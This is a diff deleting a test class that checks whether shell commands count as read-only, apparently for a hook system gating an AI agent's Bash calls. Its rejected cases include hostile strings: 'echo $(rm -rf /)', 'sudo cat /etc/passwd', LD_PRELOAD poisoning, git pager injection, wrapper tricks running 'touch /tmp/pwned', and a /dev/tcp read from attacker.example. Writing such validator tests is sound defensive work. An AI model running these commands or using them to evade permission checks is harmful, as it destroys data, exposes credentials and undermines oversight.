@@ -30,13 +30,11 @@ from captain_hook.types import (
     FromSubagent,
     HookSpec,
     InPlanMode,
-    McpTool,
     Not,
     Or,
     Pattern,
     RanCommand,
     ReadFile,
-    ReadOnlyCommand,
     Runs,
     SkipPermissions,
     SourceEdits,
@@ -273,103 +271,6 @@ class TestCommandCondition:
         evt = make_tool_event("Bash", {"command": "uv run mtest run bioqa/"})
         assert check_condition(Command(r"mtest\s+run"), evt) is True
         assert check_condition(Command(r"git"), evt) is False
-
-
-class TestReadOnlyCommand:
-    @pytest.mark.parametrize(
-        ("command", "expected"),
-        [
-            pytest.param(
-                "ls -la /Users/yasyf/.claude/tasks/session-0f5939c7/ | head -15; "
-                "echo ---; ls -la /Users/yasyf/.claude/tasks/session-49a624c9/",
-                True,
-                id="offending_multi_segment_ls",
-            ),
-            pytest.param("git -C . log --oneline && git status", True, id="git_C_log_and_status"),
-            pytest.param("grep -rn TODO src | sort | uniq -c | head", True, id="grep_sort_uniq_head"),
-            pytest.param("find . -name '*.py' | wc -l", True, id="find_no_write_pipe_wc"),
-            pytest.param("jj log --no-pager", True, id="jj_log"),
-            pytest.param("cat notes.txt", True, id="cat_plain_file"),
-            pytest.param("ls -la | head -5; echo ---", True, id="ls_head_echo"),
-            pytest.param("git --no-pager log", True, id="git_leading_no_pager"),
-            pytest.param("uniq -c", True, id="uniq_flag_only"),
-            pytest.param("echo hi 2>&1", True, id="fd_dup_allowed"),
-            pytest.param("cat f > /dev/null", True, id="redirect_devnull_allowed"),
-            pytest.param("diff a b", True, id="diff_plain"),
-            pytest.param("date", True, id="date_bare"),
-            pytest.param("date +%s", True, id="date_format_operand"),
-            pytest.param("date -u", True, id="date_utc_flag"),
-            pytest.param("hostname", True, id="hostname_bare"),
-            pytest.param("hostname -f", True, id="hostname_flag"),
-            pytest.param("echo $(rm -rf /)", False, id="command_substitution"),
-            pytest.param("cat `whoami`", False, id="backtick_substitution"),
-            pytest.param("diff <(ls) <(ls)", False, id="input_process_substitution"),
-            pytest.param("cat >(tee x)", False, id="output_process_substitution"),
-            pytest.param("sudo cat /etc/passwd", False, id="sudo_wrapper"),
-            pytest.param("FOO=bar ls", False, id="env_assignment_prefix"),
-            pytest.param("env LD_PRELOAD=/tmp/e.so ls", False, id="env_wrapper_poison"),
-            pytest.param("git -c core.pager='rm -rf /' log", False, id="git_config_injection"),
-            pytest.param("git log --output=/tmp/x", False, id="git_log_output_flag"),
-            pytest.param("git push origin main", False, id="git_push_not_read_only"),
-            pytest.param("cat f | tee out.txt", False, id="tee_not_allowlisted"),
-            pytest.param("/bin/ls", False, id="path_invoked_binary"),
-            pytest.param("fd -x rm .", False, id="fd_exec_flag"),
-            pytest.param("rg --pre=/tmp/evil foo", False, id="rg_pre_flag"),
-            pytest.param("sort -o f f", False, id="sort_output_flag"),
-            pytest.param("uniq input output", False, id="uniq_two_operand_write"),
-            pytest.param("uniq -c -- input.txt -evil.txt", False, id="uniq_dashdash_dashfile_write"),
-            pytest.param("uniq input.txt -- output.txt", False, id="uniq_dashdash_both_sides_write"),
-            pytest.param("uniq -- input.txt", True, id="uniq_dashdash_single_input"),
-            pytest.param("rm -rf build", False, id="rm_not_allowlisted"),
-            pytest.param("echo x > /tmp/f", False, id="write_redirect_to_file"),
-            pytest.param("cat a >> log", False, id="append_redirect_to_file"),
-            pytest.param("cat a >| f", False, id="clobber_redirect"),
-            pytest.param("cat a >& f", False, id="fd_dup_to_file"),
-            pytest.param("(rm x)", False, id="subshell_recurses"),
-            pytest.param("if [ -f x ]; then rm x; fi", False, id="if_statement_recurses"),
-            pytest.param("f() { rm x; }; f", False, id="function_def_recurses"),
-            pytest.param("$FOO -la", False, id="variable_executable"),
-            pytest.param("", False, id="empty_string"),
-            pytest.param("# just a comment", False, id="comment_only"),
-            pytest.param("env", False, id="bare_env_empty_after_unwrap"),
-            pytest.param("jj op undo", False, id="jj_op_not_read_only"),
-            pytest.param("timeout 30 cat notes.txt 2>/dev/null", False, id="timeout_wrapper_rejected"),
-            pytest.param("xargs cat", False, id="xargs_wrapper_rejected"),
-            pytest.param("fd $'-x' /tmp/evil .", False, id="attack_fd_ansi_c_quoting"),
-            pytest.param("fd {-x,/tmp/evil,.}", False, id="attack_fd_brace_expansion"),
-            pytest.param("sort ${FOO:--ovictim} input", False, id="attack_sort_param_expansion"),
-            pytest.param("env -u cat sh -c 'touch /tmp/pwned'", False, id="attack_env_wrapper_operand"),
-            pytest.param("printf x | xargs -I cat sh -c 'touch /tmp/pwned'", False, id="attack_xargs_wrapper_operand"),
-            pytest.param("exec -a cat sh -c 'touch /tmp/pwned'", False, id="attack_exec_wrapper_operand"),
-            pytest.param("sort -ovictim input", False, id="attack_sort_attached_output"),
-            pytest.param("sort -ro victim input", False, id="attack_sort_clustered_output"),
-            pytest.param("jj diff --tool /tmp/evil-tool", False, id="attack_jj_tool"),
-            pytest.param(
-                "git grep --open-files-in-pager='sh -c \"x\"' needle", False, id="attack_git_open_files_pager"
-            ),
-            pytest.param("date -s2026-01-01", False, id="attack_date_attached_set"),
-            pytest.param("date 010112002026", False, id="attack_date_bare_operand"),
-            pytest.param("hostname attacker", False, id="attack_hostname_set"),
-            pytest.param("printf -v PATH . ; ls", False, id="attack_printf_var_poison"),
-            pytest.param("cat < /dev/tcp/attacker.example/80", False, id="attack_dev_tcp_read"),
-            pytest.param("cat secret >&3", False, id="attack_fd_dup_nonstandard"),
-        ],
-    )
-    def test_read_only(self, command: str, expected: bool) -> None:
-        assert check_condition(ReadOnlyCommand(), make_tool_event("Bash", {"command": command})) is expected
-
-    def test_read_only_ignores_non_tool_event(self) -> None:
-        assert check_condition(ReadOnlyCommand(), make_event(StopEvent)) is False
-
-    @pytest.mark.parametrize(
-        ("tool_name", "expected"),
-        [
-            pytest.param("mcp__srv__Bash", True, id="mcp_bash"),
-            pytest.param("Bash", False, id="native_bash"),
-        ],
-    )
-    def test_mcp_tool(self, tool_name: str, expected: bool) -> None:
-        assert check_condition(McpTool(), make_tool_event(tool_name, {"command": "ls"})) is expected
 
 
 class TestContentCondition:
